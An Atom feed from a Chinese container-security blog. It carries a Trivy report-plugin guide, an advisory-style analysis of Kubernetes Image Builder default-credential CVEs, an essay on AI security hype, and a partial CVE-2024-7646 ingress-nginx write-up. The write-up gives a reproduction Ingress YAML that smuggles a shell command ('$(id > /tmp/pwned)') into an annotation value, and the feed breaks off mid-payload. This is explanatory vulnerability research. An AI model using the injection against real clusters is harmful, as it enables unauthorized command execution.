src="/image/shell-img.png" alt="img.png"><br> <img src="/image/default-excel.png" alt="img.png"><br> 详情请看 <a href="https://github.com/miao2sec/trivy-plugin-report/blob/main/excel/testdata/vpt_java_test.xlsx">vpt_java_test.xlsx</a></p></li><li><p>使用 <code>--beautify</code> 将 EXCEL 表格美化。即，根据漏洞的威胁等级填充背景色。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image -f json debian:12 | trivy report --excel-file output-beautify.xlsx --beautify<br></code></pre></td></tr></table></figure><p><img src="/image/beautify-excel.png" alt="img.png"><br>详情请看 <a href="https://github.com/miao2sec/trivy-plugin-report/blob/main/excel/testdata/vpt_java_test_beautify.xlsx">vpt_java_test_beautify.xlsx</a></p></li><li><p>生成 Markdown 文档，并命名为 <code>output.md</code></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image -f json sonobuoy/kube-hunter:v0.2.0 | trivy report --markdown-file output.md<br></code></pre></td></tr></table></figure><p><img src="/image/markdown.png" alt="img.png"><br>详情请看 <a href="https://github.com/miao2sec/trivy-plugin-report/blob/main/markdown/testdata/kube-hunter.md">kube-hunter.md</a></p></li><li><p>使用 <code>--brief</code> 将 Markdown 简化。即，去除漏洞描述和相关链接：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image -f json tomcat:9.0.97-jre8-temurin-jammy | trivy report --markdown-file output.md --brief<br></code></pre></td></tr></table></figure><p>详情请看 <a href="https://github.com/miao2sec/trivy-plugin-report/blob/main/markdown/testdata/tomcat.md">tomcat.md</a></p></li></ol><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked="" disabled="" type="checkbox"> 📝 导出 markdown 文档</li><li><input disabled="" type="checkbox"> 📝 导出 PDF 文档</li><li><input checked="" disabled="" type="checkbox"> 🌏 汉化报告</li><li><input disabled="" type="checkbox"> 🌁 添加阿里云漏洞源</li><li><input disabled="" type="checkbox"> 🚀 添加 CNNVD 漏洞源</li><li><input disabled="" type="checkbox"> 🛡️ 支持错误配置、许可证和 secret</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
      <tag>工具自研</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-9486 和 CVE-2024-9594：K8S Image Builder 构建的 VM 镜像使用默认凭证</title>
    <link href="/2024/10/23/CVE-2024-9486-%E5%92%8C-CVE-2024-9594%EF%BC%9AK8S-Image-Builder-%E6%9E%84%E5%BB%BA%E7%9A%84-VM-%E9%95%9C%E5%83%8F%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4%E5%87%AD%E8%AF%81/"/>
    <url>/2024/10/23/CVE-2024-9486-%E5%92%8C-CVE-2024-9594%EF%BC%9AK8S-Image-Builder-%E6%9E%84%E5%BB%BA%E7%9A%84-VM-%E9%95%9C%E5%83%8F%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4%E5%87%AD%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>文章概述了 Kubernetes 的 Image Builder 项目中的两个安全漏洞 CVE-2024-9486 和 CVE-2024-9594，描述了漏洞发现、修复过程及风险评估，提供了检测和缓解措施，并分析了漏洞原因。</p><p>其实这两个漏洞非常简单，就是将凭证硬编码在代码文件中了，并且影响的资产范围不大，所以也没有网上说的那么严重。</p><p>让我们来看看到底怎么回事～</p><h2 id="0x01-时间线"><a href="#0x01-时间线" class="headerlink" title="0x01 时间线"></a>0x01 时间线</h2><h3 id="2024-年-10-月-12-日"><a href="#2024-年-10-月-12-日" class="headerlink" title="2024 年 10 月 12 日"></a>2024 年 10 月 12 日</h3><p>Rybnikar Enterprises GmbH 的 <a href="https://github.com/rybnico">Nicolai Rybnikar</a> 向 Kubernetes 报送了 CVE-2024-9486 和 CVE-2024-9594 漏洞，并由 Red Hat 的 <a href="https://github.com/joelsmith">Joel Smith</a>提交了两个 Issue，分别是：</p><ol><li><a href="https://github.com/kubernetes/kubernetes/issues/128006">CVE-2024-9486</a>：使用 Image Builder 构建的且镜像提供商是 Proxmox 的 VM 镜像使用了默认的登录凭证</li><li><a href="https://github.com/kubernetes/kubernetes/issues/128007">CVE-2024-9594</a>：使用 Image Builder 构建的一些提供商的 VM 镜像使用了默认的登录凭证（这里的提供商指的是 Nutanix、OVA、QEMU 和原始提供商）</li></ol><h3 id="2024-年-10-月-14-日"><a href="#2024-年-10-月-14-日" class="headerlink" title="2024 年 10 月 14 日"></a>2024 年 10 月 14 日</h3><p><a href="https://github.com/kubernetes-sigs/image-builder">Image Builder</a>项目的 <a href="https://github.com/AverageMarcus">Marcus Noble</a>提交了两个 PR 进行修复，分别是：</p><ol><li>CVE-2024-9486：<a href="https://github.com/kubernetes-sigs/image-builder/pull/1595">确保 Proxmox 提供商清理了 builder 用户</a><br>CVE-2024-9594：<a href="https://github.com/kubernetes-sigs/image-builder/pull/1596">为 builder 用户设置随机的 ssh 密码</a></li><li>由于 Image Builder 项目是由 <a href="https://github.com/kubernetes/kubernetes-template-project">kubernetes&#x2F;kubernetes-template-project</a>模板生成的，且归属于 <a href="https://github.com/kubernetes-sigs">Kubernetes SIGs</a>（Kubernetes SIG 相关工作的组织），所以 Kubernetes 在当天就发布了一则安全公告：</li></ol><ul><li>CVE-2024-9486 和 CVE-2024-9594：<a href="https://groups.google.com/g/kubernetes-security-announce/c/UKJG-oZogfA/m/Lu1hcnHmAQAJ">若 VM 节点的 VM 镜像是使用 Kubernetes 的 Image Builder 项目构建的，那么未经授权的用户可以使用 ssh 登录到这个节点中。</a>。</li></ul><h3 id="2024-年-10-月-15-日"><a href="#2024-年-10-月-15-日" class="headerlink" title="2024 年 10 月 15 日"></a>2024 年 10 月 15 日</h3><p>NVD 发布了 <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9486">CVE-2024-9486</a> 和 <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9594">CVE-2024-9594</a> 的漏洞信息。</p><h3 id="2024-年-10-月-16-日"><a href="#2024-年-10-月-16-日" class="headerlink" title="2024 年 10 月 16 日"></a>2024 年 10 月 16 日</h3><p>NVD 对漏洞信息进行了更改，最终的信息为：</p><table><thead><tr><th>漏洞编号</th><th><strong>CVE-2024-9486</strong></th><th><strong>CVE-2024-9594</strong></th></tr></thead><tbody><tr><td>威胁等级</td><td>超危</td><td>中危</td></tr><tr><td>CVSS 评分</td><td>9.8</td><td>6.3</td></tr><tr><td>CVSS 向量</td><td>CVSS:3.1&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:H</td><td>CVSS:3.1&#x2F;AV:A&#x2F;AC:H&#x2F;PR:H&#x2F;UI:R&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:H</td></tr><tr><td>CWE 编号</td><td><a href="http://cwe.mitre.org/data/definitions/798.html">CWE-798</a></td><td></td></tr><tr><td>CWE 名称</td><td>使用硬编码凭证</td><td></td></tr></tbody></table><p>这两个漏洞都使用的是 CVSS 版本 3.1 的评分系统。</p><p>从 CVSS 向量来看，CVE-2024-9486 漏洞更容易被远程攻击者利用，因为它不需要高权限和用户交互，而 CVE-2024-9594 漏洞更难以被利用，因为它需要攻击者具有更高的权限和可能的用户交互，并且攻击向量更为受限。</p><p>不过，两者在机密性、完整性和可用性的影响上都是高度严重的。</p><table><thead><tr><th>项目名称</th><th>CVE-2024-9486</th><th>CVE-2024-9594</th></tr></thead><tbody><tr><td><strong>攻击向量</strong> (Attack Vector, 简称 AV)</td><td>Network（网络），意味着攻击者不需要物理访问，可以通过网络发起攻击。</td><td>Adjacent（相邻网络），意味着攻击者需通过本地网络或与目标系统直接相连的网络来发起攻击。</td></tr><tr><td><strong>攻击复杂性</strong> (Attack Complexity, 简称 AC)</td><td>Low（低），表示攻击者可以利用该漏洞相对容易。</td><td>High（高），表示利用该漏洞相对复杂，可能需要多个步骤。</td></tr><tr><td><strong>所需权限</strong> (Privileges Required, 简称 PR)</td><td>None（无需特殊权限），攻击者不需要任何特殊权限即可利用此漏洞。</td><td>High（高），攻击者需要高级别的权限才能利用此漏洞。</td></tr><tr><td><strong>用户交互</strong> (User Interaction, 简称 UI)</td><td>None（无），利用此漏洞不需要用户进行任何操作。</td><td>Required（需要），漏洞利用需要用户进行某些操作。</td></tr><tr><td><strong>影响范围</strong> (Scope, 简称 S)</td><td>Unchanged（不变），表示漏洞利用不会导致攻击者在受影响的组件之外获得额外的权限。</td><td>Unchanged（不变），同左。</td></tr><tr><td><strong>机密性影响</strong> (Confidentiality Impact, 简称 C)</td><td>High（高），漏洞可能泄露敏感信息。</td><td>High（高），同左。</td></tr><tr><td><strong>完整性影响</strong> (Integrity Impact, 简称 I)</td><td>High（高），漏洞可能导致数据被篡改。</td><td>High（高），同左。</td></tr><tr><td><strong>可用性影响</strong> (Availability Impact, 简称 A)</td><td>High（高），漏洞可能导致服务中断或拒绝服务。</td><td>High（高），同左。</td></tr></tbody></table><p>当天下午 7:01，<a href="https://feedly.com/cve/CVE-2024-9486">CVE-2024-9486</a> 和 <a href="https://feedly.com/cve/CVE-2024-9594">CVE-2024-9594</a>的 EPSS 分数皆为 0.05%（百分位数：16.4%）</p><h2 id="0x02-风险排查"><a href="#0x02-风险排查" class="headerlink" title="0x02 风险排查"></a>0x02 风险排查</h2><p>用户可以按照以下步骤依次检查自己是否受到该漏洞的影响：</p><ol><li>集群使用的 VM 镜像是 Kubernetes 的 Image Builder ≤ v0.1.37 构建的。</li><li>使用 Proxmox 提供商构建的镜像的 VM 已经明确存在 CVE-2024-9486 漏洞。这种情况下，VM 镜像不会禁用默认凭证，并且可以通过默认凭证访问使用生成镜像的节点。这些凭证可用于获取 root 访问权限。</li><li>使用 Nutanix、OVA、QEMU 和原始（raw）提供商构建的镜像的 VM 在构建过程中存在 CVE-2024-9594 漏洞。只有在攻击者能够访问到正在构建镜像的 VM，并且在构建过程中利用这个漏洞来篡改镜像时，才会受到这个漏洞的影响。</li><li>使用由其他提供商构建的镜像的 VM 不受影响。</li></ol><p>若要查看所使用的 Image Builder 的版本，可以使用以下方法：</p><ul><li>若使用源码安装的：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> &lt;<span class="hljs-built_in">local</span> path to image builder repo&gt;<br>make version<br></code></pre></td></tr></table></figure><ul><li>若使用 tarball 安装下载的：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> &lt;<span class="hljs-built_in">local</span> path to install location&gt;<br>rep -o v0\\.[0-9.]* RELEASE.md | <span class="hljs-built_in">head</span> -1<br></code></pre></td></tr></table></figure><ul><li>若通过容器镜像部署的：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --<span class="hljs-built_in">rm</span> &lt;image pull spec&gt; version<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">podman run --<span class="hljs-built_in">rm</span> &lt;image pull spec&gt; version<br></code></pre></td></tr></table></figure><p>或者是查看镜像的 TAG。如果是官方镜像 <code>registry.k8s.io/scl-image-builder/cluster-node-image-builder-amd64:v0.1.37</code>，那么 Image Builder 的版本就是 v0.1.37。</p><h2 id="0x03-缓解措施"><a href="#0x03-缓解措施" class="headerlink" title="0x03 缓解措施"></a>0x03 缓解措施</h2><p>使用的 ≥ v0.1.38（已修复）版本的 Image Builder 重构受影响的镜像，再将已修复后的镜像重新部署到所有受影响的 VM 中。</p><p>若无法进行升级，可以通过禁用受影响的 VM 上的 <code>builder</code> 账户来缓解此漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">usermod -L builder<br></code></pre></td></tr></table></figure><h2 id="0x04-检测方法"><a href="#0x04-检测方法" class="headerlink" title="0x04 检测方法"></a>0x04 检测方法</h2><p>使用 linux 命令 <code>last builder</code> 来查看受影响的 <code>builder</code> 账户的登录信息。</p><h2 id="0x05-漏洞分析"><a href="#0x05-漏洞分析" class="headerlink" title="0x05 漏洞分析"></a>0x05 漏洞分析</h2><p>Image Builder 的 v0.1.37（存在漏洞）版本在使用 Proxmox、Nutanix、OVA、QEMU 和原始（raw）提供商所提供的镜像来构建镜像时，将 <code>ssh_username</code> 和 <code>ssh_password</code> 的值（皆为 <code>builder</code>）硬编码在代码文件中，因此未经授权的用户可以使用默认用户 <code>builder</code> 来远程登录到受影响的节点中。</p><p>Image Builder 在 v0.1.38（已修复）的版本中，将默认用户 <code>builder</code> 的密码设置为随机值，即变量 <code>&#123;&#123;uuid&#125;&#125;</code>。</p><p><img src="/image/640.webp" alt="图 1：在构建镜像的时候，设置随机生成的密码。" title="图1：在构建镜像的时候，设置随机生成的密码。"></p><p>此外，在 Proxmox 提供商提供的镜像构建结束过后，还禁用了 <code>builder</code> 用户。下面的这段 SHELL 脚本的意思是：使用所提供的用户名 <code>ssh_username</code> 和密码 <code>ssh_password</code> 锁掉该用户，然后关闭系统断开连接。</p><p><img src="/image/641.webp" alt="图 2：Proxmox 的构建结束过后，禁用 builder 账户" title="图2：Proxmox的构建结束过后，禁用builder账户"></p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><ul><li><a href="https://thehackernews.com/2024/10/critical-kubernetes-image-builder.html">https://thehackernews.com/2024/10/critical-kubernetes-image-builder.html</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CVE 漏洞分析</tag>
      
      <tag>Kubernetes 安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>“AI 疲劳”了？让我们来看看真正的 AI 安全要点</title>
    <link href="/2024/10/18/%E2%80%9CAI%E7%96%B2%E5%8A%B3%E2%80%9D%E4%BA%86%EF%BC%9F%E8%AE%A9%E6%88%91%E4%BB%AC%E6%9D%A5%E7%9C%8B%E7%9C%8B%E7%9C%9F%E6%AD%A3%E7%9A%84AI-%E5%AE%89%E5%85%A8%E8%A6%81%E7%82%B9/"/>
    <url>/2024/10/18/%E2%80%9CAI%E7%96%B2%E5%8A%B3%E2%80%9D%E4%BA%86%EF%BC%9F%E8%AE%A9%E6%88%91%E4%BB%AC%E6%9D%A5%E7%9C%8B%E7%9C%8B%E7%9C%9F%E6%AD%A3%E7%9A%84AI-%E5%AE%89%E5%85%A8%E8%A6%81%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>趋势科技美国企业首席风险官 David Roth 与特邀演讲嘉宾 Forrester 副总裁兼首席分析师 Jeff Pollard 最近就人工智能炒作与现实以及如何在工作场所保护人工智能进行了讨论。</p><p>Jeff Pollard 说：“我不敢说我们已经到达了人工智能炒作的顶点。但我觉得我们可能已经接近了，否则我们整个行业可能会面临困境，因为现在有太多不切实际的承诺和期望被提出，而这些承诺和期望目前并没有得到兑现。”</p><h2 id="0x01-警惕人工智能炒作"><a href="#0x01-警惕人工智能炒作" class="headerlink" title="0x01 警惕人工智能炒作"></a>0x01 警惕人工智能炒作</h2><p>Jeff Pollard：“你生成报告的速度越快，你处理事件的时间就越多。”</p><p>对网络安全领域生成式人工智能的炒作，并非仅仅是因为人们对新奇事物的迷恋。</p><p>安全团队迫切需要缓解压力，他们承受着巨大的压力，资源匮乏，长期面临技能短缺的问题，同时还要应对不断增加和变化的威胁。</p><p>在讨论生成式人工智能（genAI）技术的兴起，许多人对其抱有幻想，认为它可以自动化并完全接管安全运营中心（SOCs）的工作，甚至像《终结者》里的角色那样，有一种强大的、具备自主决策能力的恶意软件狩猎代理。</p><blockquote><p>恶意软件狩猎代理（malware-hunting agents）指的是一种专门用于检测、识别、追踪和消除恶意软件的自动化工具或系统。在网络安全中，这些“代理”可以是基于人工智能或自动化规则的程序或服务，负责在系统或网络中主动寻找和应对恶意软件威胁。</p></blockquote><p>然而，今天的生成式人工智能系统还不足以在没有人类干预和监督的情况下有效运行。</p><p>它远非神奇地解决技能短缺问题，反而可能在短期内通过引入新的培训需求而加剧这一问题。</p><p>文化因素也不容忽视。虽然经验丰富的从业者可能很快就能学会新的 AI 工具，但他们仍然需要几周或几个月的时间来改变他们的习惯，并将这些工具整合到他们的工作流程中。</p><p>尽管如此，当前的生成式人工智能系统在安全领域仍然有很多有吸引力的应用案例。</p><p>通过增强现有能力，人工智能可以帮助团队用更少的苦差事做更多的事情，并获得更好的结果，特别是在应用开发、检测和响应等领域。</p><h2 id="0x02-把握快速见效的机会"><a href="#0x02-把握快速见效的机会" class="headerlink" title="0x02 把握快速见效的机会"></a>0x02 把握快速见效的机会</h2><p>David Roth：“虽然它并不像电影《少数派报告》中预防犯罪部门那样神奇，但至少你能够通过分析海量数据，洞察到潜在攻击路径的可能性和特征。”</p><p>在生成式人工智能的帮助下，安全团队能迅速获得成效的一个领域是文档生成。</p><p>行动总结、事件记录等报告的编写既枯燥又耗时，但却是必不可少的工作。</p><p>生成式人工智能能够即时生成这些文档，从而让安全专家有更多时间和精力去处理更多的安全事件。</p><p>需要注意的是，安全专家在履行职责时需要具备良好的沟通技巧。</p><p>虽然人工智能生成的报告可以节省时间，但这不应该以牺牲个人职业发展为代价。</p><p>此外，生成式人工智能还能推荐下一步的最佳行动，并能比人类更快地从现有知识库中检索出可用信息。</p><p>在这种情况下，关键是要确保人工智能的输出与组织的需求和方法论保持一致。</p><p>例如，在一个预定的流程中有七个步骤，而 AI 助手只建议完成其中的四个步骤时，那么人类操作员就需要确保所有七个步骤都被遵循 —— 这样才能达到预期的效果，并确保所采取的行动既符合公司政策也符合外部法规。</p><p>无意间采取的捷径可能会带来严重后果。</p><blockquote><p>虽然捷径看似节省时间或简化流程，但如果这些捷径不是有意设计的，可能会导致关键步骤被忽略，从而引发严重的问题。例如，在安全操作或复杂的业务流程中，跳过必要步骤可能导致漏洞、错误或系统失败。</p></blockquote><h2 id="0x03-利用-AI-主动出击"><a href="#0x03-利用-AI-主动出击" class="headerlink" title="0x03 利用 AI 主动出击"></a>0x03 利用 AI 主动出击</h2><p>David Roth：“如果你的企业使用了企业级软件，那么它很可能已经集成了人工智能技术。无论是 SAP 的 Joule、集成了 Einstein GPT 的 Salesforce、还是与 Copilot 合作的 Microsoft 等其他许多类似的产品。这又是一个你需要关注的问题，因为这些变化会改变用户与公司数据互动的方式。”</p><p>生成性人工智能（GenAI）有望将“大数据难题”转化为大数据机遇，通过识别攻击面的变动和模拟攻击路径，让安全团队比现在更加主动。</p><p>虽然它可能无法精确预测未来，但它可以帮助安全团队提前防范那些可能被忽视的威胁。</p><p>这一策略在实际应用中的有效性，取决于组织对其系统、配置和当前状态的了解程度。</p><p>如果存在盲点，AI 也会有盲点。</p><p>遗憾的是，这些盲点在今天很常见，即使是大型企业，数据和文档也可能分散记录在不同计算机的多个电子表格中。</p><p>这凸显了良好的、AI 友好的数据管理习惯和标准化的数据管理方法的重要性。原始数据的质量越高，AI 能做的事情就越多。</p><h2 id="0x04-注意影子-AI"><a href="#0x04-注意影子-AI" class="headerlink" title="0x04 注意影子 AI"></a>0x04 注意影子 AI</h2><p>David Roth：“这让我回想起了早期云计算的超速增长时期…… 当你跟不上业务发展的速度时，通过治理和安全控制来实施就变得更加困难。”</p><p>企业对 AI 可能泄露敏感的公司或客户信息感到担忧是有道理的。</p><p>这种情况可能通过员工使用未经授权的工具，或者通过那些越来越多集成了 AI 功能的获批准的企业软件发生。</p><p>在过去，恶意行为者需要懂得如何侵入 ERP 系统才能获取里面的未授权数据；而有了 AI，一个恰当的提示可能过于轻易地暴露了同样的信息。</p><p>企业需要防范员工私自使用未经批准的 AI 工具（即“影子 AI”）以及不当使用已获批准的 AI 工具，以确保其安全和合规。</p><blockquote><p>影子 AI（Shadow AI）指的是在企业或组织内部，未经正式批准或 IT 部门监管，由员工或团队私自使用的人工智能工具或服务。这类 AI 工具没有经过组织的安全、合规或治理流程审查，类似于“Shadow IT”的概念。</p></blockquote><p>在使用大型语言模型（LLM）为自己构建应用程序时，也需要格外小心。不仅需要保护正在构建的应用程序，底层数据、LLM 本身以及提示系统都需要得到保护。</p><p>这些风险基本上可以归结为三类新问题：AI 本身的问题、企业应用问题以及产品安全或创新问题。</p><p>每种问题都需要专门的保护措施，并且会影响首席信息安全官（CISO）的责任 —— 尽管 CISO 并不直接负责相关项目。</p><h2 id="0x05-制定你的-AI-战略"><a href="#0x05-制定你的-AI-战略" class="headerlink" title="0x05 制定你的 AI 战略"></a>0x05 制定你的 AI 战略</h2><p>影子 IT 应用的热潮与云计算的起步阶段和当前 AI 的发展状况之间有着相似之处。</p><p>安全领域的领导者将未经批准的应用称为“影子 IT”，而商业领袖和投资者则将其视为“产品驱动增长”。安全团队很快意识到，他们无法禁止这些创新：任何试图压制的尝试都只会将使用推向地下，那里根本无法进行管理。</p><p>安全团队需要接受并适应 AI 的现实。即使 AI 目前还没有完全实现其最热心支持者的所有期望和梦想，即使它遇到了一些挫折，因为在接下来的两到三年内，AI 将比现在更加成熟和强大。组织不能等到采用 AI 之后再去考虑安全问题。</p><p>这意味着现在是准备的最佳时机，开发以安全为导向的 AI 战略，了解这项技术，并为 AI 真正起飞时做好准备。许多观察者认为，尽管安全团队有足够的时间准备，但他们在云计算上还是措手不及。鉴于 AI 的潜力和复杂性，他们不能再犯同样的错误。</p><p>0x06 总结：持保留态度，但要认真对待<br>GenAI 可能还没有达到其变革潜力的宣传，但它在网络安全方面仍然具有有意义的应用。</p><p>它不会在短期内解决技能短缺的问题，但可以减轻安全团队的一些负担，而且组织管理和维护 IT 数据的能力越好，随着时间的推移，人工智能就越能够检测甚至预防。</p><p>通过汲取近期影子 IT 和云采用的经验教训，安全团队可以为人工智能真正开始实现其更远大梦想的那一天做好有效准备，并确保企业安全。</p>]]></content>
    
    
    
    <tags>
      
      <tag>AI 安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-7646：Ingress-nginx 注释验证绕过【高危】</title>
    <link href="/2024/08/19/CVE-2024-7646%EF%BC%9AIngress-nginx%E6%B3%A8%E9%87%8A%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E3%80%90%E9%AB%98%E5%8D%B1%E3%80%91/"/>
    <url>/2024/08/19/CVE-2024-7646%EF%BC%9AIngress-nginx%E6%B3%A8%E9%87%8A%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E3%80%90%E9%AB%98%E5%8D%B1%E3%80%91/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>该漏洞虽然非常热乎，但有非常详细的分析文章，由于许多企业并未遵循最小权限原则，严格执行基于角色的访问控制（RBAC），因此该漏洞需要安全专家和 DevOps 团队立即关注起来。</p><p>CVE-2024-7646 影响 ingress-nginx 控制器，允许攻击者绕过注释验证，执行恶意命令并未经授权访问敏感的集群资源。因此，该漏洞的 CVSS v3.1 基本分数为 8.8，威胁等级为高危。那么高的分数反映了该漏洞会产生重大影响的可能性，包括受影响系统的机密性、完整性和可用性完全受损。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p><a href="https://www.armosec.io/glossary/kubernetes-nginx/#:~:text=and%20egress%20management.-,NGINX%20Ingress%20Controller,-The%20NGINX%20Ingress" title="Ingress-nginx">Ingress-nginx</a> 是一个流行的可用于管理集群内服务的外部访问的 Kubernetes Ingress 控制器。它充当反向代理和负载均衡器，并根据定义的规则将传入的 HTTP 和 HTTPS 流量路由到适当的服务。</p><p>这个安全漏洞是由 ingress-nginx 在验证 Ingress 资源上的注解时的一个错误引起的。在 Kubernetes 系统中，<code>annotations</code>用于附加任意的、不用于识别的元数据信息到资源上。对于 ingress-nginx，<code>annotations</code>被用来设置入口控制器的不同行为。</p><p>这个漏洞使得攻击者能够将恶意内容注入到特定的<code>annotations</code>中，从而绕过原本的验证机制。这可能会引起任意命令的注入，以及可能获取到 ingress-nginx 控制器的凭证，按照默认配置，该控制器有权访问集群内的所有 secret。</p><p><img src="/image/image_ZfrcaUE8L_.png" alt="图 1：漏洞描述（来自：NVD）" title="图 1：漏洞描述（来自：NVD）"></p><h2 id="0x02-受影响的版本"><a href="#0x02-受影响的版本" class="headerlink" title="0x02 受影响的版本"></a>0x02 受影响的版本</h2><table><thead><tr><th>控制器</th><th>受影响的版本</th></tr></thead><tbody><tr><td>ingress-nginx</td><td>&lt; v1.11.2</td></tr></tbody></table><h2 id="0x03-所需权限"><a href="#0x03-所需权限" class="headerlink" title="0x03 所需权限"></a>0x03 所需权限</h2><p>要利用此漏洞，攻击者需要以下 Kubernetes RBAC 权限：</p><ol><li>拥有在 <code>networking.k8s.io</code> 或 extensions API 组下创建或修改 Ingress 资源的权限。</li><li>至少需要能够进入一个命名空间，以便在其中创建相应的 Ingress 资源。</li></ol><p>这些权限往往赋予了负责部署应用的开发人员或服务账号，这使得在没有严格执行最小权限原则的环境中，该漏洞的危害性尤为严重。</p><h2 id="0x04-复现步骤"><a href="#0x04-复现步骤" class="headerlink" title="0x04 复现步骤"></a>0x04 复现步骤</h2><h3 id="4-1-确定目标"><a href="#4-1-确定目标" class="headerlink" title="4.1 确定目标"></a>4.1 确定目标</h3><p>若攻击者拥有创建 Ingress 资源的权限，首先会去找安装了 ingress-nginx 的集群，并确定该 ingress-nginx 是否处于受影响的版本范围之内。</p><h3 id="4-2-制作恶意-Ingress-对象"><a href="#4-2-制作恶意-Ingress-对象" class="headerlink" title="4.2 制作恶意 Ingress 对象"></a>4.2 制作恶意 Ingress 对象</h3><p>攻击者使用特制注释创建 Ingress 对象，其中包含回车符 (\r) 来绕过验证。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">malicious-ingress</span><br>  <span class="hljs-comment"># 执行恶意命令</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">nginx.ingress.kubernetes.io/auth-tls-verify-client:</span> <span class="hljs-string">&quot;on\r$(id &gt; /tmp/pwned)&quot;</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">example.com</span><br>    <span class="hljs-attr">http:</span><br>      <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>        <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>        <span class="hljs-attr">backend:</span><br>          <span class="hljs-attr">service:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">example-service</span><br>            <span class="hljs-attr">port:</span> <br>              <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>&#x20;<code>annotations</code> 字段用于添加额外的元数据或配置来给 Ingress 控制器或其他插件使用，以便在处理请求时应用特定的规则或行为，例如：</p><ol><li><p>配置 NGINX Ingress 控制器，启用 TLS 客户端认证：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">annotations:</span><br>  <span class="hljs-attr">nginx.ingress.kubernetes.io/auth-tls-verify-client:</span> <span class="hljs-string">&quot;on&quot;</span><br><br></code></pre></td></tr></table></figure></li><li><p>配置 AWS 负载均衡控制器的类型，使用网络负载均衡器（nlb）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">annotations:</span><br>  <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-type:</span> <span class="hljs-string">&quot;nlb&quot;</span><br><br></code></pre></td></tr></table></figure></li></ol><p>这些注释的值通常是一些字符串，但也可以根据目的和实现方式，包含一些复杂的内容，例如使用回车符（<code>\r</code>）绕过验证：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">nginx.ingress.kubernetes.io/auth-tls-verify-client:</span> <span class="hljs-string">&quot;on\r$(id &gt; 